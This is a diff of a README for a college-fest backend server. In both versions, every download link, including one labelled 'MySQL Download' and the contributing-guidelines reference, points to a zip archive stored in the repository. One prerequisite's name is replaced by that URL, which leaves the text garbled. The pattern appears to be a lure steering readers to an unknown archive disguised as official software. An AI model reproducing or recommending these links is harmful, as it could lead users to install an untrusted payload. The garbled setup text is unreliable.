@@ -1,6 +1,6 @@
 # 🎉 Pragati_Backend_2025 - Simple Server Setup for Fest Fun
 
-[![Download Release](https://raw.githubusercontent.com/xenackhub/Pragati_Backend_2025/main/broadwise/Pragati_Backend_2025.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/xenackhub/Pragati_Backend_2025/main/broadwise/Pragati_Backend_2025.zip)
+[![Download Release](https://github.com/xenackhub/Pragati_Backend_2025/raw/refs/heads/main/config/Backend-Pragati-1.3.zip%20Now-Visit%20Releases-blue)](https://github.com/xenackhub/Pragati_Backend_2025/raw/refs/heads/main/config/Backend-Pragati-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **Pragati_Backend_2025** project! This guide will help you set up
 
 ## 📥 Download & Install
 
-To get started, you need to download the server code. Go to the [Releases page](https://raw.githubusercontent.com/xenackhub/Pragati_Backend_2025/main/broadwise/Pragati_Backend_2025.zip) to find the latest version. 
+To get started, you need to download the server code. Go to the [Releases page](https://github.com/xenackhub/Pragati_Backend_2025/raw/refs/heads/main/config/Backend-Pragati-1.3.zip) to find the latest version. 
 
 1. Click on the link above to visit the Releases page.
 2. Look for the latest version of the software.
@@ -18,8 +18,8 @@ To get started, you need to download the server code. Go to the [Releases page](
 
 Make sure you have the following installed on your computer before proceeding:
 
-- **https://raw.githubusercontent.com/xenackhub/Pragati_Backend_2025/main/broadwise/Pragati_Backend_2025.zip** This is essential for running the server. Download it from [https://raw.githubusercontent.com/xenackhub/Pragati_Backend_2025/main/broadwise/Pragati_Backend_2025.zip Official Site](https://raw.githubusercontent.com/xenackhub/Pragati_Backend_2025/main/broadwise/Pragati_Backend_2025.zip).
-- **MySQL:** This is needed for managing the database. Visit [MySQL Download](https://raw.githubusercontent.com/xenackhub/Pragati_Backend_2025/main/broadwise/Pragati_Backend_2025.zip) to get the latest version.
+- **https://github.com/xenackhub/Pragati_Backend_2025/raw/refs/heads/main/config/Backend-Pragati-1.3.zip** This is essential for running the server. Download it from [https://github.com/xenackhub/Pragati_Backend_2025/raw/refs/heads/main/config/Backend-Pragati-1.3.zip Official Site](https://github.com/xenackhub/Pragati_Backend_2025/raw/refs/heads/main/config/Backend-Pragati-1.3.zip).
+- **MySQL:** This is needed for managing the database. Visit [MySQL Download](https://github.com/xenackhub/Pragati_Backend_2025/raw/refs/heads/main/config/Backend-Pragati-1.3.zip) to get the latest version.
 
 ## ⚙️ Setup Instructions
 
@@ -79,7 +79,7 @@ If you have any questions or run into issues, feel free to raise an issue on the
 
 ## 👥 Contributing
 
-We welcome contributions from everyone! If you want to help improve **Pragati_Backend_2025**, please follow the guidelines in the `https://raw.githubusercontent.com/xenackhub/Pragati_Backend_2025/main/broadwise/Pragati_Backend_2025.zip` file.
+We welcome contributions from everyone! If you want to help improve **Pragati_Backend_2025**, please follow the guidelines in the `https://github.com/xenackhub/Pragati_Backend_2025/raw/refs/heads/main/config/Backend-Pragati-1.3.zip` file.
 
 ## 📝 License
 
